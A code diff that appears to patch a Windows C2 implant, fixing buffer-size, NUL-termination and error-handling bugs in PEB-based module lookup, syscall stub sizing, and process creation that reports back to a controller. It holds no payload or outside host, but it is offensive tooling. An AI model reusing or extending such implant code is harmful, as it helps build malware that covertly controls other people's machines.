@@ -111,7 +111,7 @@ PVOID LdrModulePebByString(
         Instance->Teb = NtCurrentTeb();
     }
 
-    Name = MmHeapAlloc( MAX_PATH );
+    Name = MmHeapAlloc( MAX_PATH * sizeof( WCHAR ) );
 
     Peb = Instance->Teb->ProcessEnvironmentBlock;
     Hdr = & Peb->Ldr->InLoadOrderModuleList;
@@ -120,13 +120,18 @@ PVOID LdrModulePebByString(
     for ( ; Hdr != Ent ; Ent = Ent->Flink ) {
         Ldr = C_PTR( Ent );
 
-        if ( Ldr->BaseDllName.Length <= 260 ) {
+        /* BaseDllName.Length is a byte count: only handle names that fit
+         * into the buffer with room for the NUL terminator */
+        if ( Ldr->BaseDllName.Length && Ldr->BaseDllName.Length < MAX_PATH * sizeof( WCHAR ) ) {
+
+            ULONG Chars = Ldr->BaseDllName.Length / sizeof( WCHAR );
 
             MemCopy( Name, Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length );
+            Name[ Chars ] = L'\0';
 
             /* turn the module name from PEB to upper */
             do {
-                if ( Idx < Ldr->BaseDllName.Length ) {
+                if ( Idx < Chars ) {
                     if ( Name[ Idx ] >= 'a' ) {
                         Name[ Idx ] -= 0x20;
                     }
@@ -143,12 +148,12 @@ PVOID LdrModulePebByString(
                 return Ldr->DllBase;
             }
 
-            MemZero( Name, MAX_PATH );
+            MemZero( Name, MAX_PATH * sizeof( WCHAR ) );
         }
     }
 
     if ( Name ) {
-        MemZero( Name, MAX_PATH );
+        MemZero( Name, MAX_PATH * sizeof( WCHAR ) );
         MmHeapFree( Name );
         Name = NULL;
     }
@@ -483,6 +488,8 @@ UINT32 GetSyscallSize(
 
     for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
     {
+        FunctionAddr = C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
+
         /* ignore redirect functions */
         if ( ( ULONG_PTR ) FunctionAddr >= ( ULONG_PTR ) ExpDirectory &&
              ( ULONG_PTR ) FunctionAddr <  ( ULONG_PTR ) ExpDirectory + ExpDirectorySize )
@@ -623,7 +630,12 @@ BOOL ProcessCreate(
             return FALSE;
         }
         MemSet( AnonPipe, 0, sizeof( ANONPIPE ) );
-        AnonPipesInit( AnonPipe );
+        if ( ! AnonPipesInit( AnonPipe ) )
+        {
+            PUTS( "Failed to initialize anon pipes" )
+            DATA_FREE( AnonPipe, sizeof( ANONPIPE ) );
+            return FALSE;
+        }
 
         StartUpInfo.hStdError  = AnonPipe->StdOutWrite;
         StartUpInfo.hStdOutput = AnonPipe->StdOutWrite;
@@ -764,7 +776,9 @@ BOOL ProcessCreate(
         {
             INT32 i  = 0;
             INT32 x  = ( INT32 ) StringLengthW( CmdLine );
-            PWCHAR s = Instance->Win32.LocalAlloc( LPTR, x * sizeof( WCHAR ) );
+            /* allocate one extra WCHAR so s[i] = 0 stays in bounds when the
+             * command line contains no space */
+            PWCHAR s = Instance->Win32.LocalAlloc( LPTR, ( x + 1 ) * sizeof( WCHAR ) );
             if ( ! s )
             {
                 PRINTF( "LocalAlloc: Failed [%d]\n", NtGetLastError() );
@@ -773,7 +787,7 @@ BOOL ProcessCreate(
                 goto Cleanup;
             }
 
-            MemCopy( s, CmdLine, x );
+            MemCopy( s, CmdLine, x * sizeof( WCHAR ) );
 
             // remove the arguments. we are just interested in the process name/path
             for ( ; i < x; i++ ) {
@@ -787,7 +801,7 @@ BOOL ProcessCreate(
             PackageAddInt32( Package, ProcessInfo->dwProcessId );
             PackageTransmit( Package );
 
-            DATA_FREE( s, x );
+            DATA_FREE( s, ( x + 1 ) * sizeof( WCHAR ) );
         }
     }
 
